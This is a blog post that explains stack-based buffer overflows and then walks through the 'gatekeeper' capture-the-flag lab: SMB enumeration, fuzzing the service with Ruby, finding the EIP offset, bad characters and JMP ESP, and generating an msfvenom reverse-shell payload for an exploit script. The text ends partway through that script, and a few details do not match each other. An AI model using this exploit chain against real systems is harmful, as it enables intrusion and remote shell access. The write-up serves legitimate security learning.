@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta http-equiv="cache-control" content="max-age=0" />
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
+    <meta http-equiv="pragma" content="no-cache" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+
+    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
+    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />
+
+    <meta name="description" content="gatekeeper (buffer overflows)">
+
+    
+        <title>gatekeeper (buffer overflows) | ༧</title>
+    
+
+    
+    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
+  </head>
+
+  <body>
+        
+        <nav>
+          <ul class="menu">
+            
+                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
+            
+          </ul>
+        </nav>
+        
+
+
+
+<div id="single-header">
+  <h1>
+    gatekeeper (buffer overflows)
+  </h1>
+  <div id="single-meta">
+    
+    
+        <span class="datesub">jan 23, 2022 &nbsp;&nbsp; m. jan 10, 2024</span>
+      
+
+  </div>
+</div>
+
+
+<div class="content-container">
+  
+
+  <main><p>lately, i&rsquo;ve been getting more and more into reverse engineering executable programs and using them to gain control of a target machine. it brings to mind what i learned in &ldquo;microcontrollers and microprocessors&rdquo;, a really interesting but tough course i took in my 3rd year of electrical engineering. the course dealt with low-level computing, mainly assembly language (aka ASM), and how it&rsquo;s used to communicate directly with computer architecture and control the usage of memory, on a hardware level. understanding memory usages and allocations on that level paved the way for utilizing buffer overflows, a very popular attack that is a result of reverse engineering.</p>
+<p>what exactly is a buffer overflow? well, what is a buffer? buffers are memory storage regions that temporarily hold data while it is transferred from one location to another. a buffer overflow happens when the volume of the data exceeds the storage capacity of the buffer. what happens then is the program, trying to write the data to the desired buffer, overwrites adjacent memory locations (blocks).</p>
+<p>take a buffer for a password that allows a user to log-in to an application. let&rsquo;s say the buffer is designed for an input of 8 bytes. if an input of 10 bytes is received, the program may write the excess data past the buffer boundary.</p>
+<p><p class="imgp">
+  <img loading="lazy" src="/buffer-overflow.png" alt="BOF"  />
+</p>
+</p>
+<h2 id="how-can-buffer-overflows-be-used-as-attacks">how can buffer overflows be used as attacks?</h2>
+<p>if buffer overflows can force some programs to write to adjacent memory blocks, it follows that an attacker can provide a large input that would force the program to write &ldquo;bad&rdquo; code to those blocks. a buffer overflow would change the execution path of the program, and the attacker can force the program and the target machine to execute a desired payload.</p>
+<p>to do this, attackers would need to know the memory layout of a program and details of the buffer, so that they could effectively abuse the storage capacity of the buffer and overwrite areas that also hold executable code. an example of this is overwriting a pointer (an object that points to another area in memory) and point it to a payload.</p>
+<p>there are 2 types of buffer overflow attacks. the first, and most common, is <strong>stack-based buffer overflow</strong>. these leverage stack memory that only exists during the runtime of a function or program.</p>
+<p>the second, less common as it&rsquo;s more difficult to carry out, is a <strong>heap-based buffer overflow</strong>. these involve flooding the memory space allocated for a program beyond memory used for current runtime operations.</p>
+<h2 id="how-can-developers-prevent-buffer-overflows">how can developers prevent buffer overflows?</h2>
+<p>on a code level, devs can prevent buffer overflows by implementing security measures directly inside the code or by using languages that offer built-in protection (like perl, java, javascript, c#).</p>
+<p>on an OS level, runtime protection measures can help thwart buffer overflows.</p>
+<ul>
+<li><strong>address space randomization (ASLR)</strong>: since buffer overflows require locations of executable code, randomizing address spaces would make this near impossible to carry out.</li>
+<li><strong>data execution prevention</strong>: this flags certain areas of memory as executable or non-executable, and would thus stop an attack from running code in a non-executable region.</li>
+<li><strong>structured exception handler overwrite protection (SEHOP)</strong>: structured exception handling (SEH) is a built-in system that manages software and hardware exceptions. <strong>SEHOP</strong> stops malicious code from attacking structured exception handling and thus prevents an attacker from using the SEH overwrite technique. SEH overwrites are achieved using a stack-based buffer overflow to overwrite an exception registration record, stored on a thread&rsquo;s stack.</li>
+</ul>
+<h2 id="gatekeeper">gatekeeper</h2>
+<p>i found this really cool challenge made by an acquaintance, which utilizes a stack-based buffer overflow as a central technique to collect the flags on a target machine. there is no further information provided, which made this challenge one of the most intense and interesting ones i&rsquo;ve cracked so far.</p>
+<p>upon getting my tun0 address (10.18.12.60) and the target&rsquo;s address (10.10.10.172), i performed an nmap scan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>nmap 10.10.10.172
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 15:47 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.90.136
+</span></span><span style="display:flex;"><span>Host is up (0.14s latency).
+</span></span><span style="display:flex;"><span>Not shown: 989 closed ports
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server
+</span></span><span style="display:flex;"><span>31337/tcp open  Elite
+</span></span><span style="display:flex;"><span>49152/tcp open  unknown
+</span></span><span style="display:flex;"><span>49153/tcp open  unknown
+</span></span><span style="display:flex;"><span>49154/tcp open  unknown
+</span></span><span style="display:flex;"><span>49155/tcp open  unknown
+</span></span><span style="display:flex;"><span>49161/tcp open  unknown
+</span></span><span style="display:flex;"><span>49165/tcp open  unknown
+</span></span></code></pre></div><p>drilling down on the open ports with a more specific nmap scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>nmap -p135,139,445,3389,31337 -A 10.10.10.172
+</span></span></code></pre></div><p>right away, i can identify an SMB service running on port 445. the next step should be second nature at this point: enumerate the SMB shares.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>smbclient -L 10.10.10.172
+</span></span></code></pre></div><p>although this command can yield some decent information, i&rsquo;ve recently come to prefer using nmap to execute an SMB enumeration script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>nmap <span style="color:#ff79c6">-</span>p <span style="color:#bd93f9">445</span> <span style="color:#ff79c6">--</span>script<span style="color:#ff79c6">=</span>smb<span style="color:#ff79c6">-</span><span style="color:#ff79c6">enum</span><span style="color:#ff79c6">-</span>shares<span style="color:#ff79c6">.</span>nse,smb<span style="color:#ff79c6">-</span><span style="color:#ff79c6">enum</span><span style="color:#ff79c6">-</span>users<span style="color:#ff79c6">.</span>nse <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">10.172</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">445</span><span style="color:#ff79c6">/</span>tcp open  microsoft<span style="color:#ff79c6">-</span>ds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span> smb<span style="color:#ff79c6">-</span><span style="color:#ff79c6">enum</span><span style="color:#ff79c6">-</span>shares: 
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>   account_used: guest
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>   \\<span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">10.172</span>\ADMIN<span style="color:#ff79c6">$</span>: 
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Type: STYPE_DISKTREE_HIDDEN
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Comment: Remote Admin
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Anonymous access: <span style="color:#ff79c6">&lt;</span>none<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Current user access: <span style="color:#ff79c6">&lt;</span>none<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>   \\<span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">10.172</span>\C<span style="color:#ff79c6">$</span>: 
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Type: STYPE_DISKTREE_HIDDEN
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Comment: Default share
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Anonymous access: <span style="color:#ff79c6">&lt;</span>none<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Current user access: <span style="color:#ff79c6">&lt;</span>none<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>   \\<span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">10.172</span>\IPC<span style="color:#ff79c6">$</span>: 
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Type: STYPE_IPC_HIDDEN
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Comment: Remote IPC
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Anonymous access: READ
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Current user access: READ<span style="color:#ff79c6">/</span>WRITE
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>   \\<span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">10.172</span>\Users: 
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Type: STYPE_DISKTREE
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Comment: 
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     Anonymous access: <span style="color:#ff79c6">&lt;</span>none<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>_    Current user access: READ
+</span></span></code></pre></div><p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_smb.jpg" alt="SMB"  />
+</p>
+</p>
+<p>the &ldquo;users&rdquo; share looks interesting, so i logged into it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>smbclient \\\\10.10.10.172\\Users
+</span></span></code></pre></div><p>upon executing <code>dir</code>, i see there&rsquo;s a file called &ldquo;gatekeeper.exe&rdquo;. to download it to my local machine, i simply execute <code>smbget smb://10.10.10.172/Users/Share/gatekeeper.exe</code></p>
+<p>at this point, i fire up a windows VM i&rsquo;d created for the purposes of reverse engineering and creating proof-of-concepts for buffer overflow attacks. i then transfer &ldquo;gatekeeper.exe&rdquo; to my windows VM using the python simplehttpserver. once it&rsquo;s downloaded to my windows machine, i open and run it in immunity debugger, a powerful application used to analyze malware and reverse engineer binary files.</p>
+<p>before i do anything else with immunity debugger, i need to find the port that gatekeeper is running on. inside the windows command prompt, i first find the process ID (PID) of the program and then use that to find the port.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>tasklist | findstr gatekeeper.exe
+</span></span></code></pre></div><p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_PID.png" alt="PID"  />
+</p>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>netstat -aon | findstr 5148
+</span></span></code></pre></div><p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_netstat.png" alt="netstat"  />
+</p>
+</p>
+<p>the program is running on port 31337.</p>
+<p>now that we know which port the program is running on, and while it&rsquo;s running inside immunity debugger (which will delineate all the memory operations of the program), i return to my kali machine to create a simple exploit that will supply gatekeeper with my inputs. if the program successfully receives my input, i&rsquo;ll then try to crash it with a large string and if that also works, i&rsquo;ll work on a proper payload that will not only break the program but force it to execute my exploit in adjacent memory.</p>
+<p>i prefer writing overflow exploits in ruby (it&rsquo;s a fun new language that i&rsquo;ve been learning), so for the simple exploit i&rsquo;ll use a runtime dev console called <code>pry</code>. this can be run directly inside the terminal.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#ff79c6">--</span>simple<span style="color:#ff79c6">-</span>prompt
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">require</span> <span style="color:#f1fa8c">&#34;socket&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> s<span style="color:#ff79c6">=</span>TCPSocket<span style="color:#ff79c6">.</span>new(<span style="color:#f1fa8c">&#34;192.168.100.4&#34;</span>,<span style="color:#bd93f9">31337</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> s<span style="color:#ff79c6">.</span>puts <span style="color:#f1fa8c">&#34;hello&#34;</span>
+</span></span></code></pre></div><p>this little piece of code opens a socket to the program running in windows (addressed at 192.168.100.4) on port 31337. it then &ldquo;puts&rdquo; a string (hello) as the input.</p>
+<p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_hello.png" alt="hello"  />
+</p>
+</p>
+<p>the program received our 6 bytes of input. now i&rsquo;m going to try and crash it. instead of &ldquo;hello&rdquo;, i&rsquo;ll send a string of As. 200 of them, to be exact.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#ff79c6">--</span>simple<span style="color:#ff79c6">-</span>prompt
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">require</span> <span style="color:#f1fa8c">&#34;socket&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> s<span style="color:#ff79c6">=</span>TCPSocket<span style="color:#ff79c6">.</span>new(<span style="color:#f1fa8c">&#34;192.168.100.4&#34;</span>,<span style="color:#bd93f9">31337</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> s<span style="color:#ff79c6">.</span>puts <span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">200</span>
+</span></span></code></pre></div><p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_A200.png" alt="A"  />
+</p>
+</p>
+<p>the program crashed, which means buffer overflow is possible!</p>
+<p>to do this, i need to calculate something called the &ldquo;EIP offset&rdquo;. EIP stands for extended instruction pointer, and it tells the computer where to go to execute the next command. it basically controls the flow of a program. the EIP offset is then the exact number of bytes in the payload after which the EIP gets overwritten. to find the EIP offset, i&rsquo;ll first create a string with which to crash the program, and then observe the EIP in immunity debugger.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>msf-pattern_create -l 200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+</span></span></code></pre></div><p>i&rsquo;ll paste this string (200 characters long) into the pry:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#ff79c6">--</span>simple<span style="color:#ff79c6">-</span>prompt
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">require</span> <span style="color:#f1fa8c">&#34;socket&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> s<span style="color:#ff79c6">=</span>TCPSocket<span style="color:#ff79c6">.</span>new(<span style="color:#f1fa8c">&#34;192.168.100.4&#34;</span>,<span style="color:#bd93f9">31337</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> s<span style="color:#ff79c6">.</span>puts <span style="color:#f1fa8c">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&#34;</span>
+</span></span></code></pre></div><p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_EIP.png" alt="EIP"  />
+</p>
+</p>
+<p>the EIP is pointed at 39654138. i can use this to find the offset:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>msf-pattern_offset -l 2500 -q 39654138
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exact match at offset 146
+</span></span></code></pre></div><p>to verify this offset value, i&rsquo;ll create an input that will enter A for the first 146 bytes, and then B for the next 4.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#ff79c6">--</span>simple<span style="color:#ff79c6">-</span>prompt
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">require</span> <span style="color:#f1fa8c">&#34;socket&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> s<span style="color:#ff79c6">=</span>TCPSocket<span style="color:#ff79c6">.</span>new(<span style="color:#f1fa8c">&#34;192.168.100.4&#34;</span>,<span style="color:#bd93f9">31337</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> s<span style="color:#ff79c6">.</span>puts <span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">146</span><span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">4</span>
+</span></span></code></pre></div><p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_B.png" alt="B"  />
+</p>
+</p>
+<p>the EIP is now overwritten with &ldquo;42424242&rdquo;, which is &ldquo;BBBB&rdquo; in hex.</p>
+<p>so, i know the program is exploitable, along with the EIP offset value. i can now write the proof-of-concept of my exploit. what i&rsquo;m trying to do is not simply crash the program, but inject a payload (&ldquo;shellcode&rdquo;) that will spawn a reverse shell that i can then use to further exploit the target machine. the skeleton of the script, called <strong>bof.rb</strong>, looks as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x90</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">146</span> <span style="color:#6272a4">#NOP slide, forces the program to start right after the offset.</span>
+</span></span><span style="display:flex;"><span>buff<span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#6272a4">#JMP ESP</span>
+</span></span><span style="display:flex;"><span>buff<span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">10</span> <span style="color:#6272a4">#additional nops for argument values</span>
+</span></span><span style="display:flex;"><span>buff<span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#6272a4">#shellcode</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">require</span> <span style="color:#f1fa8c">&#39;socket&#39;</span>
+</span></span><span style="display:flex;"><span>TCPSocket<span style="color:#ff79c6">.</span>open(<span style="color:#f1fa8c">&#34;&lt;targetIP&#34;</span>,<span style="color:#bd93f9">31337</span>){ <span style="color:#ff79c6">|</span>s<span style="color:#ff79c6">|</span> s<span style="color:#ff79c6">.</span>puts buff}
+</span></span></code></pre></div><p>the ESP register is the stack pointer, which will execute the contents of the stack. now that i have control of the EIP register, i need it to somehow point to the ESP. this is where JMP ESP comes in. JMP ESP basically jumps to the desired ESP.</p>
+<p>the shellcode section is where my payload will go. before i create a payload, i need to find the &ldquo;bad characters&rdquo;. certain byte characters cause issues in exploit development. a couple common bad characters are x00 (null byte: truncates the shellcode when executed) and x0a (carriage return). to find all possible bad characters, i&rsquo;ll just write a list of all hex characters (excluding x00 and x0a).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff<span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&#34;</span>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf<span style="color:#f1fa8c">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;</span>\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff<span style="color:#f1fa8c">&#34;&#34;</span>
+</span></span></code></pre></div><p>i&rsquo;ll run the exploit using <code>ruby bof.rb</code> and then in immunity debugger, compare against a byte array to isolate the bad characters. note the ESP when the exploit terminates: 008D19E4.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>!mona bytearray -b &#34;\x00\x01\x02\x03\x04&#34;
+</span></span><span style="display:flex;"><span>!mona compare -f C:\mona\gatekeeper\bytearray.txt 008D19E4
+</span></span></code></pre></div><p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_badchars.png" alt="badchars"  />
+</p>
+</p>
+<p>i used an expanded array from x00 to x04, and the results show that x0a is the first corrupted byte. that means the only bad characters i have are x00 and x0a.</p>
+<p>before i move on, i must verify if ASLR (address space randomization) is turned off. the attack will not work otherwise.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>!mona modules
+</span></span></code></pre></div><p>ASLR is set to &ldquo;false&rdquo;, so i can proceed with finding the JMP ESP values.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>!mona jmp -r esp -m gatekeeper.exe
+</span></span></code></pre></div><p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_esp.png" alt="ESP"  />
+</p>
+</p>
+<p>i get back 2 pointers: 0x080414c3 and 0x080416bf. i&rsquo;ll use the former, but for my script i have to convert it to <a href="https://en.wikipedia.org/wiki/Endianness"  target="_blank" rel="noreferrer nofollow">little endian</a>
+ format, which stores the least significant byte at the smallest memory address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff<span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xc3\x14\x04\x08</span><span style="color:#f1fa8c">&#34;</span>
+</span></span></code></pre></div><p>for the actual shellcode, i&rsquo;ll use msfvenom.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;local IP&gt; LPORT=4444 -f rb -b &#34;\x00\x0a&#34;
+</span></span></code></pre></div><p><p class="imgp">
+  <img loading="lazy" src="/gatekeeper_shellcode.png" alt="shellcode"  />
+</p>
+</p>
+<p>the code for bof.rb is now complete!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x90</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">146</span> <span style="color:#6272a4">#NOP slide, forces the program to start right after the offset.</span>
